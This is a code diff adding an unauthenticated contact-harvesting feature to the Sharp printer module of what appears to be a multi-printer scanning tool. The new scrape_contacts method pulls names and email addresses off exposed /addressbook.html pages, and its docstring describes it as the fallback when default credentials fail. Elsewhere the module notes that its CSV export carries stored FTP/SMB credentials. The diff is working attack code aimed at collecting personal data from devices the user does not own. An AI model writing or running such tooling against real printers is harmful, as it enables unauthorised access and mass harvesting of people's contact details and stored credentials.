@@ -21,6 +21,7 @@ Two things make Sharp different from Ricoh:
     cookie. Replaying a stale token fails.
 """
 import csv
+import html as html_module
 import io
 import re
 from typing import Dict, List, Optional, Tuple
@@ -75,6 +76,66 @@ _ATTR_RE = re.compile(r"(\w[\w-]*)\s*=\s*\"([^\"]*)\"", re.S)
 _MODEL_RE = re.compile(r"[-–]\s*([A-Z]{2}[A-Z0-9][A-Z0-9\-]*)\s*$")
 EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
 
+ADDRESS_BOOK_PATH = "/addressbook.html"
+_TABLE_RE = re.compile(r"<table[^>]*>(.*?)</table>", re.S | re.I)
+_ROW_RE = re.compile(r"<tr[^>]*>(.*?)</tr>", re.S | re.I)
+_CELL_RE = re.compile(r"<t([dh])[^>]*>(.*?)</t\1>", re.S | re.I)
+_TAG_RE = re.compile(r"<[^>]+>")
+_TOTAL_RE = re.compile(r"Total\s+Address\w*\s*:?\s*(\d+)", re.I)
+# What Sharp renders in a cell that holds nothing - including the single
+# placeholder row an empty address book still draws.
+_PLACEHOLDERS = {"", "-", "--", "------", "not set", "none"}
+
+
+def _cell_text(raw: str) -> str:
+    """Flatten a table cell to plain text, entities and &nbsp; included."""
+    text = html_module.unescape(_TAG_RE.sub(" ", raw or ""))
+    return " ".join(text.replace("\xa0", " ").split())
+
+
+def parse_address_table(page: str) -> List[Tuple[str, str]]:
+    """
+    Pull (name, email) out of the address book table.
+
+    Columns are located from the header row rather than assumed by position -
+    the visible set varies by model and by which destination types are in use.
+    """
+    for table in _TABLE_RE.findall(page or ""):
+        name_col: Optional[int] = None
+        mail_col: Optional[int] = None
+        entries: List[Tuple[str, str]] = []
+
+        for row in _ROW_RE.findall(table):
+            cells = _CELL_RE.findall(row)
+            if not cells:
+                continue
+            texts = [_cell_text(value) for _kind, value in cells]
+
+            if any(kind.lower() == "h" for kind, _value in cells):
+                for index, text in enumerate(t.lower() for t in texts):
+                    if "address name" in text or text == "name":
+                        name_col = index
+                    elif "e-mail" in text or "email" in text:
+                        mail_col = index
+                continue
+
+            if name_col is None or name_col >= len(texts):
+                continue
+            name = texts[name_col]
+            email = ""
+            if mail_col is not None and mail_col < len(texts):
+                candidate = texts[mail_col]
+                if "@" in candidate:
+                    email = candidate
+            if name.lower() in _PLACEHOLDERS and not email:
+                continue
+            if name or email:
+                entries.append((name, email))
+
+        if entries:
+            return entries
+    return []
+
 
 def _attrs(blob: str) -> Dict[str, str]:
     return {k.lower(): v for k, v in _ATTR_RE.findall(blob)}
@@ -126,6 +187,7 @@ class SharpModule(PrinterModule):
     name = "sharp"
     display_name = "Sharp MFP"
     supports_export = True
+    supports_scrape = True
     export_note = (
         "Exports via System Settings > Data Import/Export (CSV). The CSV carries stored "
         "FTP/SMB credentials for scan-to-folder destinations as well as contacts."
@@ -406,6 +468,72 @@ class SharpModule(PrinterModule):
 
         entries = max(0, len([line for line in body.splitlines() if line.strip()]) - 1)
         return hostport, f"SUCCESS: Exported {entries} entry/entries to {output_file}", output_file
+
+    # ---- unauthenticated harvest ---------------------------------------
+    def scrape_contacts(self, target: Target, ctx: ScanContext,
+                        session: Optional[Dict] = None) -> Tuple[List[str], List[str], str]:
+        """
+        Read the address book straight off /addressbook.html.
+
+        Plenty of Sharp MFPs render the full contact table to anonymous
+        visitors, so this is the fallback when the default credentials do not
+        work or the CSV export is unavailable. Any session we already hold is
+        reused, but none is required.
+
+        The page size cannot be changed without an administrative session, so a
+        device with more contacts than fit on one page yields only that page.
+        The returned message always states how many of the device's declared
+        total were actually collected, so a short read is never silent.
+        """
+        url = f"{target.base_url}{ADDRESS_BOOK_PATH}"
+        cookies = (session or {}).get("cookies") or {}
+        headers = {
+            "User-Agent": BROWSER_UA,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9",
+        }
+
+        log_request(ctx, "SHARP ADDRESS BOOK", target.hostport, "GET", url, headers, cookies)
+        try:
+            resp = http_get(url, ctx, headers=headers, cookies=cookies,
+                            allow_redirects=False, timeout=ctx.export_timeout,
+                            max_bytes=16 * 1024 * 1024)
+        except RequestException as exc:
+            return [], [], f"ERROR: {exc.__class__.__name__}: {exc}"
+
+        log_response(ctx, "SHARP ADDRESS BOOK RESPONSE", target.hostport, resp, body_limit=300)
+
+        if resp.status_code == 302:
+            dest = resp.headers.get("Location", "")
+            if "login" in dest.lower():
+                return [], [], "SKIPPED: address book requires authentication"
+            return [], [], f"SKIPPED: redirected to {dest}"
+        if resp.status_code != 200:
+            return [], [], f"ERROR: HTTP {resp.status_code}"
+
+        body = resp.text or ""
+        if PASSWORD_FIELD in body or page_title(body).lower().startswith("login"):
+            return [], [], "SKIPPED: address book requires authentication"
+
+        total_match = _TOTAL_RE.search(html_module.unescape(_TAG_RE.sub(" ", body)))
+        total = int(total_match.group(1)) if total_match else None
+
+        entries = parse_address_table(body)
+        if total == 0 or not entries:
+            return [], [], "No address book entries on this device"
+
+        emails = [email for _name, email in entries if email]
+        names = [name for name, _email in entries if name]
+
+        if total is None:
+            message = f"SUCCESS: Harvested {len(entries)} entry/entries"
+        elif len(entries) < total:
+            message = (f"PARTIAL: Harvested {len(entries)} of {total} entry/entries - the "
+                       f"device paginates and the page size cannot be raised without an "
+                       f"admin session")
+        else:
+            message = f"SUCCESS: Harvested {len(entries)} of {total} entry/entries"
+        return emails, names, message
 
     # ---- contact extraction --------------------------------------------
     def extract_contacts(self, text: str) -> Tuple[List[str], List[str]]:
